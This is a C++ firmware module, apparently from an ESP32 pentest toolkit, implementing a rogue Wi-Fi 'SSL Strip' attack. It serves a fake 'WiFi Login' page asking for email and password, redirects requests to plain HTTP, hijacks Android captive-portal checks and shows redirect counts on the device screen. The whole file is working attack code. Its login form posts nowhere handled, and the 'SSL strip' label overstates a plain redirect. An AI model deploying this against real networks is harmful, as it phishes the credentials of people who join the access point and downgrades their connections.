#include "arsenal.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include <SD.h>
#include <WiFi.h>
#include <AsyncTCP.h>
#include <ESPAsyncWebServer.h>
#include <globals.h>

static AsyncWebServer *stripServer = nullptr;
static bool stripActive = false;
static int redirected = 0;

static const char STRIP_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><title>Redirect</title>
<script>window.location.href="http://"+window.location.hostname;</script>
</head><body><h1>Redirecting...</h1></body></html>
)rawliteral";

static const char PORTAL_HTML[] PROGMEM = R"rawliteral(
<!DOCTYPE html><html><head><title>WiFi Login</title>
<style>body{font-family:sans-serif;background:#1a1a2e;color:#e0e0e0;display:flex;justify-content:center;align-items:center;min-height:100vh;margin:0}
.c{background:#12121a;padding:32px;border-radius:12px;max-width:360px;width:90%}
input{width:100%;padding:12px;margin:8px 0;border:1px solid #333;border-radius:6px;background:#0a0a0f;color:#e0e0e0;box-sizing:border-box}
button{width:100%;padding:12px;margin-top:12px;border:none;border-radius:6px;background:#00ff88;color:#000;font-weight:bold;cursor:pointer}
h2{text-align:center;color:#00ff88}</style></head>
<body><div class="c"><h2>WiFi Login</h2>
<form><input type="text" placeholder="Email or phone" name="user">
<input type="password" placeholder="Password" name="pass"><button type="submit">Connect</button></form></div></body></html>
)rawliteral";

void arsenal_ssl_strip(void) {
    ARSENAL_HEAP_CHECK();
    if (WiFi.getMode() != WIFI_AP && WiFi.softAPgetStationNum() == 0) {
        displayRedStripe("Need AP mode active");
        delay(1500);
        return;
    }

    stripServer = new AsyncWebServer(80);
    redirected = 0;

    stripServer->on("/", HTTP_GET, [](AsyncWebServerRequest *request) {
        String host = request->host();
        if (request->hasHeader("Referer")) {
            AsyncWebHeader *ref = request->getHeader("Referer");
            if (ref->value().indexOf("https://") >= 0) {
                redirected++;
            }
        }
        request->send(200, "text/html", PORTAL_HTML);
    });

    stripServer->onNotFound([](AsyncWebServerRequest *request) {
        String url = "http://" + request->host() + request->url();
        AsyncWebServerResponse *response = request->beginResponse(301);
        response->addHeader("Location", url);
        request->send(response);
    });

    stripServer->on("/generate_204", HTTP_GET, [](AsyncWebServerRequest *request) {
        AsyncWebServerResponse *response = request->beginResponse(302);
        response->addHeader("Location", "http://192.168.4.1");
        request->send(response);
    });

    stripServer->on("/gen_204", HTTP_GET, [](AsyncWebServerRequest *request) {
        AsyncWebServerResponse *response = request->beginResponse(302);
        response->addHeader("Location", "http://192.168.4.1");
        request->send(response);
    });

    stripServer->begin();
    stripActive = true;

    drawMainBorderWithTitle("SSL Strip");
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.setTextSize(FP);
    tft.setCursor(12, 50);
    tft.print("HTTP downgrade proxy active");
    tft.setCursor(12, 66);
    tft.printf("Portal at %s", WiFi.softAPIP().toString().c_str());
    tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
    tft.drawCentreString("Esc:stop", tftWidth / 2, tftHeight - 20, 1);

    while (true) {
        drawMainBorderWithTitle("SSL Strip");
        int y = 45;
        tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
        tft.setTextSize(FP);
        tft.setCursor(12, y);
        tft.printf("Redirects: %d", redirected);
        y += 14;
        tft.setCursor(12, y);
        tft.printf("Station: %d", WiFi.softAPgetStationNum());
        y += 14;
        tft.setCursor(12, y);
        tft.printf("Portal at: %s", WiFi.softAPIP().toString().c_str());
        tft.setTextColor(TFT_YELLOW, bruceConfig.bgColor);
        tft.drawCentreString("Esc:stop", tftWidth / 2, tftHeight - 20, 1);

        if (check(EscPress)) break;
        delay(200);
    }

    stripServer->end();
    delete stripServer;
    stripServer = nullptr;
    stripActive = false;
}
